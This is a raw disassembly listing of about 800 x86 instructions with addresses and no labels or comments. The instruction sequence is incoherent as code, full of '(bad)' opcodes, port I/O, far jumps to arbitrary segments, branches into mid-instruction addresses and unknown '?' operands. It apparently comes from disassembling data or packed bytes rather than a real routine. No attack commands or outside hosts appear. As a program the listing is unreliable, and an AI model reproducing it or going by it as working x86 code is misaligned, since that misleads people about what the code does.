  412ef8:	daa    
  412ef9:	fist   WORD PTR [ecx]
  412efb:	lahf   
  412efc:	dec    ebp
  412efd:	enter  0x6156,0x50
  412f01:	inc    esp
  412f02:	pop    eax
  412f03:	pop    ebx
  412f04:	jmp    0xb543:0xf33a19f5
  412f0b:	stos   DWORD PTR es:[edi],eax
  412f0c:	ficomp WORD PTR [ecx+0x45]
  412f0f:	xchg   ebx,eax
  412f10:	pop    ebx
  412f11:	gs push esi
  412f13:	jno    0x412e98
  412f15:	sbb    al,0x90
  412f17:	add    DWORD PTR [edx],eax
  412f19:	jl     0x412f66
  412f1b:	mov    edx,0x1e3ba3aa
  412f20:	mov    edi,0xdc948c50
  412f25:	pop    edx
  412f26:	mov    dl,0x3d
  412f28:	push   ebx
  412f29:	clc    
  412f2a:	out    dx,eax
  412f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f2c:	js     0x412ef8
  412f2e:	sub    BYTE PTR [ecx+0x55],bh
  412f31:	mov    eax,ds:0x6b8c3c7f
  412f36:	cld    
  412f37:	lahf   
  412f38:	aaa    
  412f39:	and    esp,DWORD PTR [edi]
  412f3b:	xchg   DWORD PTR [ecx],edi
  412f3d:	retf   0x61ac
  412f40:	ret    0x5483
  412f43:	jnp    0x412fbd
  412f45:	retf   0x1c43
  412f48:	push   eax
  412f49:	sahf   
  412f4a:	mov    edx,0x6043768c
  412f4f:	jo     0x412f4e
  412f51:	mov    dh,0xf3
  412f53:	sub    BYTE PTR [esp],ah
  412f56:	and    BYTE PTR ds:0x92d22677,ch
  412f5c:	sbb    BYTE PTR [esi-0x41eee8d0],ah
  412f62:	mov    edx,0xcf4ffda9
  412f67:	or     al,0xab
  412f69:	pusha  
  412f6a:	mov    ds:0xe9729d5e,al
  412f6f:	add    al,0xb
  412f71:	fs retf 0xec21
  412f75:	mov    ds:0x95c9dc12,eax
  412f7a:	cmp    ebp,eax
  412f7c:	loope  0x412f60
  412f7e:	addr16 cmp al,0x6f
  412f81:	and    ecx,DWORD PTR fs:[eax+0x549dbf0c]
  412f88:	(bad)  
  412f89:	out    0xf6,al
  412f8b:	or     al,0x1
  412f8d:	mov    dl,0x7d
  412f8f:	cmp    BYTE PTR [esi-0x798337c4],dl
  412f95:	push   ds
  412f96:	dec    ebx
  412f97:	dec    ecx
  412f98:	ror    bh,cl
  412f9a:	push   DWORD PTR [ebx+0x5b]
  412f9d:	inc    ebx
  412f9e:	and    BYTE PTR [esp+ebx*2-0x40b8ab74],ah
  412fa5:	fabs   
  412fa7:	fild   DWORD PTR [esp+eax*4]
  412faa:	and    esp,DWORD PTR [ecx+0x7863fc9d]
  412fb0:	jmp    0xcb861e5e
  412fb5:	out    0x95,eax
  412fb7:	addr16 das 
  412fb9:	stos   DWORD PTR es:[edi],eax
  412fba:	mov    bl,0xbe
  412fbc:	sbb    al,dl
  412fbe:	xchg   esi,eax
  412fbf:	imul   ebx,DWORD PTR [edi+edx*1-0x52851312],0x8d00c31d
  412fca:	pop    edi
  412fcb:	or     DWORD PTR [esi+0x42],edi
  412fce:	repz mov dl,0x7e
  412fd1:	xchg   DWORD PTR [esi],esp
  412fd3:	add    eax,edx
  412fd5:	or     cl,BYTE PTR [ebp+esi*4-0x50]
  412fd9:	iret   
  412fda:	out    dx,eax
  412fdb:	sub    edx,ebx
  412fdd:	cwde   
  412fde:	pop    ds
  412fdf:	lahf   
  412fe0:	mov    gs,WORD PTR [ebx-0xeecdbd1]
  412fe6:	sub    eax,DWORD PTR [edi]
  412fe8:	(bad)  
  412fe9:	inc    ebx
  412fea:	fld    QWORD PTR [edx+0x3411ba13]
  412ff0:	mov    esi,0x6e7a4c4b
  412ff5:	inc    ebp
  412ff6:	cmp    DWORD PTR [edx+ebp*2],eax
  412ff9:	add    eax,0x21b51bcb
  412ffe:	outs   dx,BYTE PTR ds:[esi]
  412fff:	lods   eax,DWORD PTR ds:[esi]
  413000:	(bad)  
  413001:	and    cl,BYTE PTR [edx-0x59]
  413004:	and    BYTE PTR [edi],0x5e
  413007:	jl     0x412fd6
  413009:	xchg   edi,eax
  41300a:	arpl   WORD PTR [eax-0xe9c0ab5],ax
  413010:	sub    edx,DWORD PTR [ebp-0x10]
  413013:	jb     0x412fc5
  413015:	ins    BYTE PTR es:[edi],dx
  413016:	add    eax,0x34bfcafe
  41301b:	pop    ecx
  41301c:	(bad)  
  41301d:	fistp  WORD PTR ds:0x558b316b
  413023:	jo     0x413038
  413025:	out    0xff,al
  413027:	ins    BYTE PTR es:[edi],dx
  413028:	into   
  413029:	ja     0x413073
  41302b:	js     0x413086
  41302d:	mul    DWORD PTR [esi]
  41302f:	(bad)  
  413031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413032:	sti    
  413033:	out    0xc3,al
  413035:	push   cs
  413036:	es push ebp
  413038:	shr    BYTE PTR [esi],cl
  41303a:	adc    bh,BYTE PTR [esi]
  41303c:	push   esi
  41303d:	hlt    
  41303e:	out    0x52,eax
  413040:	or     BYTE PTR [ecx-0x672bf345],0x81
  413047:	push   0xffffffd8
  413049:	pop    edi
  41304a:	or     eax,0xf2643eaf
  41304f:	jb     0x412fe2
  413051:	es mov dl,0xbb
  413054:	pusha  
  413055:	retf   
  413056:	cmp    edi,DWORD PTR [esp+edx*8+0x38]
  41305a:	(bad)  
  41305c:	scas   al,BYTE PTR es:[edi]
  41305d:	stc    
  41305e:	sbb    eax,0xca56135c
  413063:	call   0xafa3b68e
  413068:	pop    eax
  413069:	adc    eax,0xb690a4bb
  41306e:	dec    ecx
  41306f:	shr    esi,0x86
  413072:	xlat   BYTE PTR ds:[ebx]
  413073:	push   es
  413074:	add    eax,DWORD PTR [eax+0x6c80df29]
  41307a:	(bad)  
  41307c:	js     0x4130b0
  41307e:	pop    edi
  41307f:	rcl    DWORD PTR [esi+0x1ff32e9d],0xdf
  413086:	mul    DWORD PTR ds:0xd7b7af9a
  41308c:	or     al,0x58
  41308e:	mov    ch,0x0
  413090:	pop    esp
  413091:	lds    eax,FWORD PTR [edi]
  413093:	push   cs
  413094:	mov    eax,ds:0x183b226a
  413099:	clc    
  41309a:	popa   
  41309b:	jno    0x413041
  41309d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309e:	jmp    0x7688:0xb042b4ef
  4130a5:	and    eax,0x586e6814
  4130aa:	sub    cl,BYTE PTR [edi+ebx*2-0x60318778]
  4130b1:	push   eax
  4130b2:	cmp    edi,DWORD PTR ds:0xfaf62d41
  4130b8:	add    DWORD PTR [edi-0x6f9b0894],ecx
  4130be:	mov    ds:0xb8ee494e,al
  4130c3:	pushf  
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	xor    dl,cl
  4130c7:	pusha  
  4130c8:	jl     0x4130f0
  4130ca:	adc    ecx,DWORD PTR [edx+0x3d]
  4130cd:	xor    BYTE PTR [eax],bl
  4130cf:	jo     0x41314f
  4130d1:	sar    DWORD PTR [edi-0xc],0x1b
  4130d5:	adc    esp,DWORD PTR [ebx]
  4130d7:	or     ebp,DWORD PTR [esi]
  4130d9:	xchg   esp,eax
  4130da:	pop    ss
  4130db:	jo     0x41314c
  4130dd:	sbb    dh,BYTE PTR [eax+0x4]
  4130e0:	pop    ebx
  4130e1:	xchg   ah,ch
  4130e3:	pushf  
  4130e4:	pop    ss
  4130e5:	retf   
  4130e6:	adc    cl,dh
  4130e8:	pop    ebx
  4130e9:	in     eax,0x8d
  4130eb:	dec    eax
  4130ec:	pop    esp
  4130ed:	js     0x413078
  4130ef:	mov    bh,0xc8
  4130f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f2:	mov    BYTE PTR [ebx+esi*8],dh
  4130f5:	xchg   esp,eax
  4130f6:	pop    ebx
  4130f7:	loop   0x413088
  4130f9:	jne    0x413152
  4130fb:	cmp    ch,cl
  4130fd:	popa   
  4130fe:	shl    DWORD PTR [edx],1
  413100:	push   ss
  413101:	pop    eax
  413102:	hlt    
  413103:	in     al,dx
  413104:	repz dec ebx
  413106:	xor    BYTE PTR [eax*4+0x45d7204b],ah
  41310d:	repz stc 
  41310f:	call   0xf1cf779e
  413114:	in     al,0xc4
  413116:	mov    al,ds:0x4980c913
  41311b:	cmp    eax,0xbeb257b
  413120:	(bad)  
  413121:	sar    BYTE PTR [ebx+edx*1],cl
  413124:	dec    ebx
  413125:	mov    WORD PTR [edx+0x5af5aab5],ds
  41312b:	les    eax,FWORD PTR [esi-0x44230a07]
  413131:	adc    edx,DWORD PTR [ecx]
  413133:	or     ch,BYTE PTR [ecx+esi*2+0x49]
  413137:	scas   eax,DWORD PTR es:[edi]
  413138:	pushf  
  413139:	retf   0xbc94
  41313c:	dec    ebx
  41313d:	and    BYTE PTR [ecx+0x7f],bl
  413140:	neg    DWORD PTR [esi-0x7f]
  413143:	cli    
  413144:	rcr    BYTE PTR [edx+esi*2+0x78],1
  413148:	xchg   esp,eax
  413149:	mov    dh,0x46
  41314b:	shr    DWORD PTR [edi+0x46],0x36
  41314f:	imul   esp,DWORD PTR [ebp+0x4819850a],0xfffffffb
  413156:	bound  ebx,QWORD PTR fs:[ecx]
  413159:	sbb    eax,0x5b32c046
  41315e:	data16 sbb BYTE PTR [edi+0x466fe8aa],dl
  413165:	pop    ebp
  413166:	add    al,0x13
  413168:	(bad)  
  413169:	sahf   
  41316a:	sub    al,BYTE PTR [ecx]
  41316c:	je     0x413150
  41316e:	int    0xf4
  413170:	cmc    
  413171:	(bad)  [edi+0xb288538]
  413177:	adc    edi,DWORD PTR [ecx+0x1b]
  41317a:	sub    eax,0x686c36a1
  41317f:	dec    ebx
  413180:	(bad)  
  413181:	xchg   esi,eax
  413182:	xchg   edi,eax
  413183:	inc    ebx
  413184:	inc    edx
  413185:	push   ss
  413186:	mov    WORD PTR [eax],gs
  413188:	push   ebp
  413189:	add    DWORD PTR [ecx],0x1c
  41318c:	(bad)  
  41318d:	lds    ebx,FWORD PTR [ecx]
  41318f:	or     al,0x91
  413191:	cwde   
  413192:	xlat   BYTE PTR ds:[ebx]
  413193:	add    BYTE PTR [edi],al
  413195:	inc    esp
  413196:	mov    eax,ds:0x8e471d02
  41319b:	sub    al,0x8a
  41319d:	jge    0x41312b
  41319f:	dec    edx
  4131a0:	jmp    0x413208
  4131a2:	xchg   edi,eax
  4131a3:	sbb    DWORD PTR [eax+0x15e79748],ecx
  4131a9:	xchg   edx,eax
  4131aa:	and    bl,0x15
  4131ad:	jb     0x413132
  4131af:	xlat   BYTE PTR ds:[ebx]
  4131b0:	imul   edx,DWORD PTR [esi-0x77f39d06],0x3d81ac5a
  4131ba:	mov    BYTE PTR [ecx+0x7739a692],dh
  4131c0:	daa    
  4131c1:	dec    esi
  4131c2:	mov    ebx,DWORD PTR [edi-0x4366674a]
  4131c8:	mov    ds:0xceb77c59,al
  4131cd:	push   ebx
  4131ce:	ins    BYTE PTR es:[edi],dx
  4131cf:	sub    eax,0xf1bc0673
  4131d4:	ja     0x4131ca
  4131d6:	loop   0x413187
  4131d8:	mov    dh,ah
  4131da:	push   ebp
  4131db:	xor    BYTE PTR [ecx+ebx*1],ch
  4131de:	loope  0x41324a
  4131e0:	xor    DWORD PTR [esi+esi*4+0x3109234c],ebx
  4131e7:	cmp    bh,BYTE PTR [eax-0x27ca3053]
  4131ed:	sbb    eax,0x1741b054
  4131f2:	das    
  4131f3:	shl    al,cl
  4131f5:	lods   eax,DWORD PTR ds:[esi]
  4131f6:	mov    dl,0xe
  4131f8:	jmp    0xa491f9c4
  4131fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fe:	popf   
  4131ff:	cmp    al,BYTE PTR [ebx]
  413201:	pop    ecx
  413202:	loop   0x4131dc
  413204:	cmp    ah,BYTE PTR [ebp-0x454aed37]
  41320a:	pop    ecx
  41320b:	gs pop es
  41320d:	sbb    al,0x5e
  41320f:	xor    BYTE PTR [ebx],0xb2
  413212:	ltr    WORD PTR [esi]
  413215:	pop    edx
  413216:	pop    ds
  413217:	inc    ebx
  413218:	cmc    
  413219:	xor    BYTE PTR [esi],ch
  41321b:	bound  ebp,QWORD PTR [esi+0x1795a5e6]
  413221:	adc    ebx,DWORD PTR [edx+0x15]
  413224:	pop    edx
  413225:	mov    ch,0x76
  413227:	out    dx,eax
  413228:	das    
  413229:	call   0xfc6eeee
  41322e:	test   ch,ch
  413230:	and    bh,BYTE PTR [edx]
  413232:	ficomp WORD PTR [ebx]
  413234:	popf   
  413235:	push   ecx
  413236:	adc    eax,0xf210f98d
  41323b:	jne    0x41323c
  41323d:	lock jmp 0x413226
  413240:	lods   eax,DWORD PTR ds:[esi]
  413241:	push   ss
  413242:	inc    ebx
  413243:	mov    ecx,0x2047bb5e
  413248:	xor    DWORD PTR [esi+0x74e98e24],edi
  41324e:	test   BYTE PTR [edx],bl
  413250:	jl     0x413298
  413252:	jae    0x413263
  413254:	std    
  413255:	iret   
  413256:	mov    eax,ds:0xb174dac9
  41325b:	jp     0x4132c1
  41325d:	daa    
  41325e:	imul   ebp,esp,0xb7347bfe
  413264:	popf   
  413265:	xlat   BYTE PTR ds:[ebx]
  413266:	jbe    0x4132aa
  413268:	test   BYTE PTR [eax-0x10acd40c],ah
  41326e:	test   BYTE PTR [edi+ebx*1-0x412b92a7],cl
  413275:	fadd   QWORD PTR ds:0x1d3d01e5
  41327b:	stos   BYTE PTR es:[edi],al
  41327c:	icebp  
  41327d:	sbb    ch,BYTE PTR ds:0x12e8a457
  413283:	dec    ebx
  413284:	stc    
  413285:	add    BYTE PTR [ebx-0xa],0xe8
  413289:	jne    0x4132f8
  41328b:	stc    
  41328c:	jmp    0x4132dd
  41328e:	popa   
  41328f:	inc    ebx
  413290:	xor    esp,DWORD PTR [edi-0x12]
  413293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413294:	sub    BYTE PTR [ecx],cl
  413296:	cs push 0xffffffde
  413299:	push   cs
  41329a:	pop    ss
  41329b:	outs   dx,DWORD PTR ds:[esi]
  41329c:	mov    al,0x22
  41329e:	xchg   edi,eax
  41329f:	lods   eax,DWORD PTR ds:[esi]
  4132a0:	push   es
  4132a1:	push   eax
  4132a2:	dec    edx
  4132a3:	and    DWORD PTR [ebp+0x56cb80b3],edx
  4132a9:	out    dx,al
  4132aa:	(bad)  
  4132ab:	xor    edi,edi
  4132ad:	stc    
  4132ae:	fnsave [eax+0x23e78ace]
  4132b4:	outs   dx,BYTE PTR ds:[esi]
  4132b5:	mov    dh,0xd3
  4132b7:	lods   al,BYTE PTR ds:[esi]
  4132b8:	xchg   edi,eax
  4132b9:	dec    esi
  4132ba:	adc    eax,0x40f38a71
  4132bf:	arpl   WORD PTR [edx],dx
  4132c1:	xor    eax,edx
  4132c3:	or     DWORD PTR [ebp-0xcc90f8b],edi
  4132c9:	mov    ecx,cs
  4132cb:	in     al,dx
  4132cc:	stos   BYTE PTR es:[edi],al
  4132cd:	cmp    al,0x34
  4132cf:	mov    ebx,0xb3a12a4
  4132d4:	stos   BYTE PTR es:[edi],al
  4132d5:	jns    0x4132ac
  4132d7:	test   ecx,ebp
  4132d9:	mov    dl,0xb4
  4132db:	sbb    BYTE PTR [ecx-0x1f],cl
  4132de:	push   ebx
  4132df:	sbb    ecx,ebx
  4132e1:	jb     0x4132af
  4132e3:	jo     0x4132e4
  4132e5:	ret    0x171e
  4132e8:	push   eax
  4132e9:	cmp    BYTE PTR [esi-0x6a],0x1b
  4132ed:	pop    ds
  4132ee:	cwde   
  4132ef:	das    
  4132f0:	retf   
  4132f1:	pop    eax
  4132f2:	test   eax,0x3c6d5e0a
  4132f7:	test   DWORD PTR [ebx+0x53b7fad0],0xad2cbfb9
  413301:	sti    
  413302:	test   BYTE PTR ds:0x13ce0bba,bl
  413308:	cdq    
  413309:	xchg   esi,eax
  41330a:	and    ch,ah
  41330c:	sub    DWORD PTR [bp+si],eax
  41330f:	test   eax,0xa7c374ff
  413314:	out    0x2c,eax
  413316:	shl    cl,1
  413318:	mov    cl,0xb2
  41331a:	stos   DWORD PTR es:[edi],eax
  41331b:	mov    WORD PTR [esi-0x75],?
  41331e:	stos   BYTE PTR es:[edi],al
  41331f:	mov    edi,0x6c8e460e
  413324:	cld    
  413325:	mov    WORD PTR [eax],fs
  413327:	jns    0x413325
  413329:	mov    eax,ds:0xa8c4ee81
  41332e:	stos   DWORD PTR es:[edi],eax
  41332f:	push   0x35b6600f
  413334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413335:	and    al,0xbc
  413337:	lods   al,BYTE PTR ds:[esi]
  413338:	aad    0x8d
  41333a:	adc    dh,BYTE PTR [edx]
  41333c:	mov    edi,0xcf34b41a
  413341:	pop    ebp
  413342:	nop
  413343:	out    0x27,al
  413345:	popf   
  413346:	sub    eax,0x8073c9b1
  41334b:	pusha  
  41334c:	mov    ds:0x6612e430,al
  413351:	dec    edx
  413352:	aaa    
  413353:	sbb    ebp,esp
  413355:	mov    WORD PTR [ebx-0x2081bcdd],?
  41335b:	imul   esi,DWORD PTR [edx],0xe
  41335e:	inc    eax
  41335f:	hlt    
  413360:	(bad)  
  413361:	int3   
  413362:	xlat   BYTE PTR ds:[ebx]
  413363:	sub    bh,bh
  413365:	int    0x64
  413367:	mov    ecx,0x71830088
  41336c:	(bad)  
  41336d:	gs jp  0x4133e7
  413370:	cmp    BYTE PTR [ebp-0x623b405a],al
  413376:	push   edi
  413377:	mov    WORD PTR [eax],?
  413379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41337a:	mov    BYTE PTR [eax+0x4e2f334c],ch
  413380:	(bad)  
  413381:	popf   
  413382:	sub    BYTE PTR [ecx+0x42998415],cl
  413388:	jecxz  0x4133ba
  41338a:	push   esp
  41338b:	lock ins DWORD PTR es:[edi],dx
  41338d:	push   es
  41338e:	repz loopne 0x41333b
  413391:	(bad)
  413396:	push   0xffffff89
  413398:	data16 in al,dx
  41339a:	mov    esp,0x1e429ecb
  4133a0:	imul   esp,DWORD PTR [ebp-0x66be3c31],0x5c
  4133a7:	pop    edi
  4133a8:	lea    esi,[edx+0x6cbe8bda]
  4133ae:	push   eax
  4133af:	and    BYTE PTR [ebx+0x30],al
  4133b2:	xor    BYTE PTR [esi-0x53],ch
  4133b5:	jmp    0xf306:0x84dc594b
  4133bc:	mov    eax,0x575b9bef
  4133c1:	mov    ecx,0xdc445be1
  4133c6:	fiadd  WORD PTR [esi-0x76]
  4133c9:	pop    esi
  4133ca:	xchg   edi,eax
  4133cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cc:	adc    DWORD PTR [edi],0xffffff92
  4133cf:	pop    esi
  4133d0:	adc    DWORD PTR [edx],esi
  4133d2:	mov    dh,0x3e
  4133d4:	mov    ebx,fs
  4133d6:	jbe    0x4133e5
  4133d8:	jno    0x413389
  4133da:	lods   al,BYTE PTR ds:[esi]
  4133db:	fdivp  st(7),st
  4133dd:	clc    
  4133de:	inc    ebp
  4133df:	scas   eax,DWORD PTR es:[edi]
  4133e0:	and    al,BYTE PTR [edx-0x6b621872]
  4133e6:	pop    edi
  4133e7:	call   0x383e:0xb1991a07
  4133ee:	pop    es
  4133ef:	mov    al,ds:0xd8555b47
  4133f4:	jmp    0x41343c
  4133f6:	icebp  
  4133f7:	jns    0x413458
  4133f9:	dec    esi
  4133fa:	dec    eax
  4133fb:	xchg   edx,eax
  4133fc:	mov    al,ds:0xbc474633
  413401:	cli    
  413402:	sahf   
  413403:	and    al,BYTE PTR [esi+0x15e1030d]
  413409:	pop    edx
  41340a:	mov    ds:0x6e64e669,al
  41340f:	or     eax,ebx
  413411:	test   eax,0xca9c1c1
  413416:	push   eax
  413417:	cmp    dh,ch
  413419:	imul   edi,DWORD PTR [ebp+0x3d],0xf
  41341d:	add    DWORD PTR [ebp-0x15ba278],esi
  413423:	call   DWORD PTR [edi]
  413425:	retf   0x8c0b
  413428:	add    esp,edx
  41342a:	out    0xbd,al
  41342c:	jns    0x4133ef
  41342e:	in     al,dx
  41342f:	mov    eax,0x35c6c5f9
  413434:	jnp    0x4133d2
  413436:	icebp  
  413437:	(bad)  
  413438:	icebp  
  413439:	and    DWORD PTR [esi],ebx
  41343b:	dec    ebp
  41343c:	stos   DWORD PTR es:[edi],eax
  41343d:	out    0xa4,al
  41343f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413440:	adc    al,BYTE PTR ds:0xa2e36d96
  413446:	gs daa 
  413448:	aaa    
  413449:	inc    eax
  41344a:	mov    ch,0x96
  41344c:	cmc    
  41344d:	sub    eax,0x19f97ca6
  413452:	inc    edx
  413453:	js     0x4134c8
  413455:	rcr    BYTE PTR [edx+0x74],1
  413458:	mov    cl,0xc2
  41345a:	dec    edi
  41345b:	cs ins DWORD PTR es:[edi],dx
  41345d:	outs   dx,BYTE PTR ds:[esi]
  41345e:	cmc    
  41345f:	mov    ebp,0x1f9bb7ad
  413464:	xchg   DWORD PTR [edi+0x11],eax
  413467:	repz icebp 
  413469:	ins    DWORD PTR es:[edi],dx
  41346a:	mov    al,ds:0x97b809af
  41346f:	mov    BYTE PTR [edi+0x19430968],bh
  413475:	mov    ebp,0x2d7908b5
  41347a:	inc    esp
  41347b:	ss xchg ebp,eax
  41347d:	popa   
  41347e:	imul   DWORD PTR [ecx-0x6857b650]
  413484:	lahf   
  413485:	mov    ds:0x4c234a,eax
  41348a:	fild   QWORD PTR ds:0xfc62a9e0
  413490:	mov    ch,0x71
  413492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413493:	mov    WORD PTR fs:[ebx-0x4c],gs
  413497:	sbb    eax,0x941b8ed5
  41349c:	push   ss
  41349d:	xor    eax,0x484e7ab2
  4134a2:	inc    ecx
  4134a3:	xchg   BYTE PTR [eax-0xb64abd4],dh
  4134a9:	mov    eax,ds:0xc3737787
  4134ae:	pop    esi
  4134af:	mov    WORD PTR [eax+0x3fdc35b3],?
  4134b5:	inc    ecx
  4134b6:	lock stc 
  4134b8:	ret    
  4134b9:	mov    ch,0xb0
  4134bb:	fistp  QWORD PTR [esi-0x51f54277]
  4134c1:	pop    ss
  4134c2:	retf   0x7bc4
  4134c5:	(bad)  
  4134c6:	cld    
  4134c7:	shr    DWORD PTR [edx],1
  4134c9:	mov    bl,0x49
  4134cb:	adc    BYTE PTR [esp],dh
  4134ce:	iret   
  4134cf:	leave  
  4134d0:	daa    
  4134d1:	adc    eax,0x399ac83b
  4134d6:	push   esp
  4134d7:	inc    ebx
  4134d8:	xchg   edi,eax
  4134d9:	inc    edx
  4134da:	add    al,BYTE PTR [edi+0x586d7d8b]
  4134e0:	xchg   ecx,eax
  4134e1:	rcr    BYTE PTR [eax],1
  4134e3:	test   al,0x6d
  4134e5:	jae    0x413504
  4134e7:	int3   
  4134e8:	pop    edi
  4134e9:	aad    0x88
  4134eb:	and    eax,0x736e82d5
  4134f0:	xor    edx,ecx
  4134f2:	jb     0x6b9ebdb8
  4134f8:	dec    eax
  4134f9:	dec    esi
  4134fa:	int    0xa2
  4134fc:	test   BYTE PTR [edi-0x6e6e2e],bl
  413502:	sbb    BYTE PTR [edx+0x76],ch
  413505:	aad    0x84
  413507:	loope  0x413555
  413509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41350a:	cmp    BYTE PTR [esi-0x2abab2cd],dh
  413510:	cmc    
  413511:	pop    edx
  413512:	mov    al,ds:0x2612c7b3
  413517:	add    ebx,DWORD PTR ds:0x96184593
  41351d:	xchg   edx,eax
  41351e:	jnp    0x41351b
  413520:	sbb    DWORD PTR [ebp+0x22f8f9eb],esp
  413526:	push   ebp
  413527:	mov    ds:0xb0cc42b9,eax
  41352c:	inc    eax
  41352d:	pushf  
  41352e:	inc    eax
  41352f:	mov    dh,0x53
  413531:	or     BYTE PTR [edx],dh
  413533:	iret   
  413534:	mov    cl,0x11
  413536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413537:	sti    
  413538:	shr    DWORD PTR [esi-0x22],0xef
  41353c:	xor    BYTE PTR [esi+0x70],cl
  41353f:	ds dec ah
  413542:	retf   0x37b9
  413545:	hlt    
  413546:	xor    ebx,DWORD PTR [ebx+ebp*4+0x7cb9ca5e]
  41354d:	call   0xc37a:0x6175180a
  413554:	pusha  
  413555:	jl     0x41358f
  413557:	mov    ebx,0x328dfdec
  41355c:	jmp    0xc9b14abc
  413561:	hlt    
  413562:	stos   BYTE PTR es:[edi],al
  413563:	fs sub eax,esi
  413566:	pop    ds
  413567:	in     eax,dx
  413568:	call   0xb24cbd1e
  41356d:	pop    eax
  41356e:	jecxz  0x4135da
  413570:	xchg   DWORD PTR [esi-0x815af5b],eax
  413576:	mov    ebx,0x111fb115
  41357b:	pop    ebx
  41357c:	push   ebx
  41357d:	jns    0x4135fe
  41357f:	mov    ah,0x7e
  413581:	retf   
  413582:	inc    ebx
  413583:	xchg   edi,eax
  413584:	add    eax,0x8bf480ab
  413589:	push   ebx
  41358a:	mov    BYTE PTR [ebx-0x10a27c94],dl
  413590:	repz sbb edi,0x6d
  413594:	xchg   DWORD PTR [ecx+0x12],edi
  413597:	mov    ?,esi
  413599:	stos   BYTE PTR es:[edi],al
  41359a:	dec    edi
  41359b:	adc    cl,cl
  41359d:	add    BYTE PTR [edx+0x25],ah
  4135a0:	xor    al,0xfc
  4135a2:	inc    eax
  4135a3:	add    eax,0xf13d76b4
  4135a8:	loop   0x413598
  4135aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ab:	jecxz  0x4135e8
  4135ad:	out    dx,al
  4135ae:	aam    0x7d
  4135b0:	adc    ah,cl
  4135b2:	ret    
  4135b3:	cmp    eax,0xf4f051e9
  4135b8:	cmp    esi,0xffffffff
  4135bb:	and    edx,esp
  4135bd:	dec    esp
  4135be:	mov    ah,0x9f
  4135c0:	or     eax,0xc5ad6347
  4135c5:	jl     0x413604
  4135c7:	outs   dx,BYTE PTR ds:[esi]
  4135c8:	xlat   BYTE PTR ds:[ebx]
  4135c9:	mov    dl,0x17
  4135cb:	xchg   edx,eax
  4135cc:	pop    esp
  4135cd:	aad    0xb0
  4135cf:	mov    bh,0xda
  4135d1:	xchg   BYTE PTR [ebx],bl
  4135d3:	call   0xc97f:0x54721636
  4135da:	add    eax,0xbbf2bbc6
  4135df:	mov    eax,ds:0x73a429ad
  4135e4:	shl    DWORD PTR [eax],cl
  4135e6:	mov    ah,0x3
  4135e8:	sub    ah,0xdf
  4135eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ec:	xchg   ebx,eax
  4135ed:	pop    ds
  4135ee:	push   eax
  4135ef:	in     al,0xe7
  4135f1:	std    
  4135f2:	adc    bl,BYTE PTR [edx]
  4135f4:	sub    al,0xe1
  4135f6:	ins    DWORD PTR es:[edi],dx
  4135f7:	es pop ecx
  4135f9:	call   0x88ce:0x8fce3fce
  413600:	or     ecx,ecx
  413602:	xor    BYTE PTR [ebx-0x8],al
  413605:	cmp    ah,BYTE PTR [eax+0x12940065]
  41360b:	outs   dx,DWORD PTR ds:[esi]
  41360c:	lods   eax,DWORD PTR ds:[esi]
  41360d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41360e:	add    eax,0x2a7906e4
  413613:	mov    ecx,0x83425321
  413618:	add    al,0x1e
  41361a:	xchg   ebp,eax
  41361b:	scas   al,BYTE PTR es:[edi]
  41361c:	jmp    0xd5f:0xdd9af9b2
  413623:	adc    ah,BYTE PTR [edx]
  413625:	lods   eax,DWORD PTR ds:[esi]
  413626:	test   al,0x1d
  413628:	jne    0x41360d
  41362a:	in     al,0x2b
  41362c:	and    esp,DWORD PTR [ebp+0x7d]
  41362f:	mov    WORD PTR [ebx],?
  413631:	fwait
  413632:	xor    ch,BYTE PTR [esi-0x6a366796]
  413638:	mov    ds:0xcef09133,eax
  41363d:	rcl    DWORD PTR [eax+0x2f9e7698],cl
  413643:	or     dh,bl
  413645:	retf   0xc28e
  413648:	loope  0x413660
  41364a:	mov    ah,ch
  41364c:	js     0x4136cb
  41364e:	into   
  41364f:	sahf   
  413650:	(bad)  
  413651:	and    edx,DWORD PTR [edx-0x75]
  413654:	fdiv   DWORD PTR [edi-0x21a19c32]
  41365a:	jne    0x4136ac
  41365c:	out    dx,eax
  41365d:	popf   
  41365e:	mov    al,0xda
  413660:	push   ss
  413661:	fcom   QWORD PTR [ebp-0x56]
  413664:	das    
  413665:	jo     0x413659
  413667:	mov    ebx,ebp
  413669:	sbb    edi,DWORD PTR [ecx+0x2e135dc5]
  41366f:	int    0xc7
  413671:	repnz sbb BYTE PTR [esi+0xe],0x8c
  413676:	retf   
  413677:	mul    DWORD PTR [edx-0x38c58528]
  41367d:	jne    0x413623
  41367f:	push   ebx
  413680:	nop
  413681:	and    eax,0xd0ec8493
  413686:	adc    DWORD PTR [edx],ecx
  413688:	cmp    eax,0xd50a4b7
  41368d:	fldenv [esi-0x18]
  413690:	(bad)  
  413691:	call   0xabcdffb1
  413696:	jo     0x41369a
  413698:	pop    ebp
  413699:	and    BYTE PTR [eax+0x5a5d789a],ch
  41369f:	rcl    BYTE PTR [ebx],0x58
  4136a2:	sbb    al,0xcd
  4136a4:	mov    eax,ds:0x501cce
  4136a9:	and    ebx,DWORD PTR [edx+0x7b501c8a]
  4136af:	or     al,0xe1
  4136b1:	inc    ecx
  4136b2:	sar    BYTE PTR [edx],1
  4136b4:	dec    edx
  4136b5:	sub    eax,DWORD PTR [eax]
  4136b7:	xor    al,0xb1
  4136b9:	idiv   DWORD PTR [ebx]
  4136bb:	int3   
  4136bc:	pop    edi
  4136bd:	pop    eax
  4136be:	repz aad 0x64
  4136c1:	mov    dh,0xef
